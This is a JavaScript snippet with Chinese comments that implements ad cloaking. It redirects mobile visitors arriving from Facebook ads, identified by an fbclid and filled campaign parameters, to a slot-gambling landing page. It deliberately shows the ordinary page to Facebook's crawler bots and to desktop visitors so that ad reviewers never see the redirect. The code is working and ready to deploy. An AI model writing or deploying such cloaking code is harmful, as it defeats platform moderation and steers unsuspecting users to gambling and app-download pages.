(function() {
    // 【1. 配置：你的落地页主地址】
    var landing_page = "https://www.goldenslot11.com/13/?p0=1uk61sz6";

    // 【2. 增强版解析函数：完美支持中文解码】
    function getQueryParam(name) {
        var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
        var r = window.location.search.substr(1).match(reg);
        if (r != null) {
            try {
                // 使用 decodeURIComponent 解码中文素材名
                return decodeURIComponent(r[2].replace(/\+/g, " ")).trim();
            } catch (e) {
                return r[2].trim();
            }
        }
        return "";
    }

    // 【3. 核心判定逻辑】
    function shouldRedirect() {
        var search = window.location.search.toLowerCase();
        var ua = navigator.userAgent.toLowerCase();

        // A. 占位符拦截（死刑）：拦截 {{...}}
        if (search.indexOf('{{') > -1 || search.indexOf('%7b%7b') > -1) return false;

        // B. 移动端强制校验
        var isMobile = /android|iphone|ipad|ipod/.test(ua);
        if (!isMobile) return false;

        // C. 排除 FB 官方机器人
        if (ua.indexOf('facebookexternalhit') > -1 || ua.indexOf('facebot') > -1) return false;

        // D. 字段深度校验
        // 校验你提供的所有参数：pixel, apkch, mvpname, campaign, adgroup, creative
        var requiredKeys = ['pixel', 'apkch', 'mvpname', 'campaign', 'adgroup', 'creative'];
        
        for (var i = 0; i < requiredKeys.length; i++) {
            var val = getQueryParam(requiredKeys[i]);
            // 只要字段为空，就不跳转。中文解码后只要有内容即可通过。
            if (val === "") {
                console.log("拦截：关键参数 " + requiredKeys[i] + " 为空");
                return false;
            }
        }

        // E. 必须具备 fbclid (真实点击的灵魂)
        if (getQueryParam('fbclid') === "") return false;

        return true;
    }

    // 【4. 执行动作】
    if (shouldRedirect()) {
        document.documentElement.style.display = 'none';
        var connector = landing_page.indexOf('?') > -1 ? '&' : '?';
        
        // 【关键】直接透传 window.location.search，无需手动重新拼接，确保中文编码不失效
        var finalUrl = landing_page + connector + window.location.search.substring(1);
        
        window.location.replace(finalUrl);
        if (window.stop) window.stop();
    } else {
        document.documentElement.style.display = 'block';
        if (typeof init === 'function') init();
    }
})();
